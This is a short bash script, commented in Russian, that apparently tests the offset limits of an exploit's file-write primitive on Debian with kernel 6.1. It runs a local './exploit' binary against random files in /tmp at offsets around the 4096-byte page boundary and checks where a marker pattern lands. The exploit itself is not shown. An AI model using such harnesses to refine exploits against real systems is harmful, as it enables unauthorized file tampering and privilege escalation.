#!/bin/bash
# Граница смещений примитива на Debian 6.1
cd ~/exploit
for off in 2000 3000 3500 4000 4080 4084 4088 4090 4092 4096 5000 8000; do
  head -c 9000 /dev/urandom > /tmp/b$off
  chmod 644 /tmp/b$off
  hex=$(printf "%02x%02x%02x%02x" $((off%251)) $((off%241)) $((off%239)) $((off%233)))
  ./exploit /tmp/b$off $off $hex >/dev/null 2>&1
  found=$(python3 -c "d=open('/tmp/b$off','rb').read(); print(d.find(bytes.fromhex('$hex')))")
  echo "$off -> $found"
done
